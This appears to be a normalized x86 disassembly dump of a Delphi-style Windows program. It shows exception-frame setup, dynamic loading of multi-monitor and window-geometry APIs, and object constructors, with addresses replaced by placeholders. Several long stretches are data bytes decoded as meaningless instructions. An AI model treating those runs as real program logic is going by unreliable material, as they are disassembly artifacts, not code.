add [ eax ] al
add [ eax ] al
add ah ah
jpo r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_417780
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
xor al [ eax ]
xor al 0x7d
inc edx
add [ eax + 0x7800427d ] bl
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x42 ] cl
or [ ebx - 0x55170f3c ] al
mov ecx 0xda8bfffd
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add [ eax ] cl
add [ eax ] al
add [ ebx + edi * 2 + 0x35300042 ] cl
inc eax
add [ esi + 0x35400040 ] bh
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7d340040 ] bl
jl r-xdata
lea eax [ eax ]
inc eax
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
mov eax edi
call sub_4032e8
add [ ebp + edi * 2 + 0x42 ] ah
add [ esi ] al
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_427c54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_427cac
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_417780
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4032e8
sub_427cf0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_427d34
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_427d78
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_417460
mov eax esi
pop esi
pop ebx
retn
sub_427da4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427dc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427dd0
retn
sub_427de4
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_427e44
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_427de4
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_427f34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427f59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f60
retn
sub_427f6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_42802b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428032
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_427f6c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
sub_428054
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_427f6c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_4280dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_427f6c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42816c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_427f6c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_4280dc
sub_428202
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_427f6c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_428283
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_427f6c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_428370
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_427f6c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_428444
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_427f6c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_428518
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_427f6c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4286b3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4286d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286e0
retn
sub_4286f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428719
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428720
retn
sub_42872c
xor [ edi + 0xd0f0042 ] al
dec ecx
dec eax
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
xchg esp eax
adc [ eax ] eax
add [ eax - 0x6d ] ebx
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428720
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
mov [ edx ] al
or al 0x0
add [ eax ] al
pop eax
jb r-xdata
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x87987265
inc edx
add [ ecx ] al
xchg bx ax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
[ edi + eax * 4 + 0x110f0042 ]
dec ecx
inc ebx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11947265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov [ edx ] eax
add [ eax ] al
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
outsb
je r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
pop eax
xchg ebx eax
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
mov [ edx ] al
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x428768c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax + 0x72 ] bl
inc eax
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4294bf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
jo r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x87d47265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x428854c0 ]
mov [ edx ] al
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
add bh bh
call [ eax + ecx * 4 ]
inc edx
dec edi
cld
mov al 0xe
xchg [ edx ] eax
add [ esi - 0x6d ] esp
jns r-xdata
insd
xchg esp eax
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x4287d8c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40408c
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
add al 0x0
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
mov [ edx ] eax
or al 0x0
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x4004287 ] bl
add [ eax ] al
add [ edi ] cl
push esp
dec eax
insb
imul ebp [ edi + 0x6e ] 0x3800408d
mov [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ecx + 0x42 ] cl
jae r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
aam 0x88
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x772bffc0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4294c6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404ac0
lea eax [ ebp - 0x8 ]
call sub_405928
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_427c90
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405940
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_428af0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_428b66
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_428c7c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405940
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b6d
lea eax [ ebp - 0x8 ]
call sub_405928
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_428c08
mov [ rw-data ] eax
sub_428b74
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428c08
mov [ rw-data ] eax
mov ecx r-xdata
call sub_40596c
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_428bcc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405940
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_428c08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_427c54
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427c54
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427c54
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404038
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_428c7c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_428d7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_428bcc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_427ca4
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405928
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d19c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405928
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d19c
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428bcc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_427ca4
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428bcc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_427ca4
mov ecx r-xdata
call sub_40596c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428d84
lea eax [ ebp - 0xc ]
call sub_405928
lea eax [ ebp - 0x8 ]
call sub_405928
retn
sub edx 0xfffffff8
sub_428d9c
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_427c90
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_428ddc
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_427c90
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_428e0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428f9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_427c90
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428f39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428fa5
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_427c90
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
mov eax esi
xor edx edx
call sub_427c90
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_427c90
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
